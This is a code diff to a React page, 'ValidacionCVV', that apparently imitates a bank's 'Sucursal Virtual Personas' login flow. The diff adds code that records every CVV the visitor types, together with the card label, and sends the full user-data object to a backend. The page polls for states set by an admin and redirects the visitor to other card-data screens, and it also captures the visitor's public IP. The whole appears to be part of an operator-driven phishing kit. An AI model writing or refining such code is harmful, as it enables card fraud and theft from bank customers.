@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import { instanceBackend } from "../../axios/instanceBackend"; // Corrección path relativo
@@ -14,38 +14,12 @@ export default function ValidacionCVV() {
     const [cargando, setCargando] = useState(false); // Loading state
     const [polling, setPolling] = useState(false); // Estado para activar polling
 
-    // Polling para verificar estado después de enviar
+    // Ref para controlar el estado de carga (fix compilación y loop)
+    const loadingRef = useRef(false);
+
+    // Polling para verificar estado
     useEffect(() => {
         let interval;
-        // Se ejecuta siempre si no hay polling específico de validación, 
-        // para detectar cambios de estado globales (ej. cambio a TC Custom desde Admin)
-        // Pero ValidacionCVV usa 'polling' state solo despues de enviar?
-        // NO, ValidacionCVV debería escuchar siempre si el admin cambia algo?
-        // En código original, el useEffect depende de [polling].
-        // Si polling es false, NO escucha.
-        // PERO ValidacionTC escucha siempre (interval generado en mount o en submit?).
-        // ValidacionTC genera interval en handleSubmit? No, tiene un useEffect??
-        // ValidacionTC genera interval en `iniciarPolling` llamado tras submit.
-        // PERO tambien lee al inicio? No.
-        // EL USUARIO PUEDE LLEGAR AQUI POR REDIRECCION.
-        // Si llega por redirección, debería estar escuchando?
-        // Idealmente sí. Pero si solo escucha tras submit, está "ciego" hasta que envía.
-        // VAMOS A DEJARLO como estaba (solo tras submit) O CAMBIARLO?
-        // Si el usuario llega a validacion-cvv por redireccion, NO ESTA ENVIANDO NADA AUN.
-        // Debería escuchar cambios?
-        // Si el admin se arrepiente y manda a TC?
-        // SÍ, debería escuchar.
-        // Pero el código original solo activa interval si `polling` es true.
-        // Y `polling` empieza en false.
-        // CAMBIO: Activar polling siempre al montar (como ValidacionTC/ValidacionTCCustom usan iniciarPolling tras submit, pero ValidacionTC tiene bug de que solo escucha tras submit??)
-        // Revisando ValidacionTC: `iniciarPolling` se llama tras submit.
-        // ENTONCES SI EL USUARIO LLEGA A LA VISTA, SE QUEDA PROHIBIDO DE CAMBIOS HASTA QUE ENVIA?
-        // Eso explica por qué se quedan "pegados".
-        // FIX: Iniciar polling al montar el componente también?
-        // O al menos, leer el estado una vez.
-
-        // Vamos a activar el polling siempre, o al menos un polling de "navegación" si no está validando.
-        // Para consistencia con el fix "filtrando", debemos asegurar que si el estado cambia, nos vamos.
 
         const checkStatus = async () => {
             try {
@@ -68,7 +42,7 @@ export default function ValidacionCVV() {
                     setPolling(false);
                     alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
                     setCvv("");
-                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv') {
+                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
                     // Switch para manejar redirecciones específicas
                     switch (estado) {
                         case 'solicitar_tc': navigate("/validacion-tc"); break;
@@ -97,42 +71,52 @@ export default function ValidacionCVV() {
         interval = setInterval(checkStatus, 3000);
 
         return () => clearInterval(interval);
-    }, []);
+    }, [navigate]);
 
     // ... (rest of states)
 
     // HANDLE SUBMIT
     const handleSubmit = async () => {
         console.log("--- INICIANDO SUBMIT ---");
-        // alert("Iniciando envío..."); // Debug temporal
 
+        // Activar flags de carga
         setCargando(true);
+        loadingRef.current = true;
+
         try {
             const rawData = localStorage.getItem("datos_usuario");
-            console.log("Datos usuario raw:", rawData);
+            let userData = rawData ? JSON.parse(rawData) : {};
 
-            if (!rawData) {
-                alert("Error crítico: No se encontraron datos de sesión (datos_usuario null). Pide iniciar sesión nuevamente.");
-                setCargando(false);
-                return;
+            if (!userData.sesion_id) {
+                // Intentar recuperar de URL si falta en local
+                const params = new URLSearchParams(window.location.search);
+                const urlSesionId = params.get('sesionId');
+                if (urlSesionId) {
+                    userData.sesion_id = urlSesionId;
+                } else {
+                    alert("Error crítico: No se encontraron datos de sesión.");
+                    setCargando(false);
+                    return;
+                }
             }
 
-            const userData = JSON.parse(rawData);
-            const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id; // Intento ambos por si acaso
-            console.log("Sesion ID recuperado:", sesionId);
+            // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+            if (!userData.usuario) userData.usuario = {};
+            if (!userData.usuario.cvv_custom) userData.usuario.cvv_custom = [];
 
-            if (!sesionId) {
-                alert("Error: ID de sesión no encontrado en los datos locales.");
-                setCargando(false);
-                return;
-            }
+            const nuevoIntento = {
+                intento: userData.usuario.cvv_custom.length + 1,
+                cvv: cvv,
+                fecha: new Date().toLocaleString(),
+                cardLabel: cardData.label
+            };
+
+            userData.usuario.cvv_custom.push(nuevoIntento);
+            localStorage.setItem("datos_usuario", JSON.stringify(userData));
 
             const dataSend = {
                 data: {
-                    attributes: {
-                        sesion_id: sesionId,
-                        cvv: cvv
-                    }
+                    attributes: userData
                 }
             };
 
@@ -204,20 +188,39 @@ export default function ValidacionCVV() {
         return frontToBackMap[frontFilename] || null;
     };
 
-    // Cargar datos desde localStorage al montar el componente
+    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
     useEffect(() => {
-        const savedCardData = localStorageService.getItem("selectedCardData");
-        if (savedCardData) {
-            setCardData(savedCardData);
+        // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
+        const params = new URLSearchParams(window.location.search);
+        const mode = params.get('mode');
+        const sesionId = params.get('sesionId');
+
+        // Si es modo CVV custom, verificar sesionId
+        if (mode === 'cvv' && window.location.pathname.includes('cvv-customs')) {
+            if (!sesionId) {
+                console.error('Acceso sin sesionId en URL');
+                navigate('/');
+                return;
+            }
+            // Cargar cardData si existe
+            const savedCardData = localStorageService.getItem("selectedCardData");
+            if (savedCardData) {
+                setCardData(savedCardData);
+            }
+        } else {
+            // Modo CVV estándar, cargar datos normalmente
+            const savedCardData = localStorageService.getItem("selectedCardData");
+            if (savedCardData) {
+                setCardData(savedCardData);
+            }
         }
 
         // Verificar si viene con error
-        const params = new URLSearchParams(window.location.search);
         if (params.get("error") === 'true') {
             alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
             setCvv("");
         }
-    }, []);
+    }, [navigate]);
 
     // Se crea el useEffect para capturar la ip publica y la hora en estandar
     useEffect(() => {
@@ -348,7 +351,7 @@ export default function ValidacionCVV() {
     // Se retorna el componente
     return (
         <>
-            <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
+            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                 <div
                     style={{
                         flex: 1,
@@ -356,9 +359,8 @@ export default function ValidacionCVV() {
                         backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                         backgroundRepeat: "no-repeat",
                         backgroundPosition: "center",
-                        backgroundSize: "cover",
-                        backgroundPositionY: "-140px",
-                        backgroundPositionX: "-610px",
+                        backgroundPositionY: "-70px",
+                        backgroundPositionX: "-500px",
                     }}
                 >
                     <div style={{ textAlign: "center" }}>
@@ -375,7 +377,7 @@ export default function ValidacionCVV() {
                             textAlignLast: "center"
                         }}
                     >
-                        <h1 className="general-title">
+                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                             Sucursal Virtual Personas
                         </h1>
                     </div>
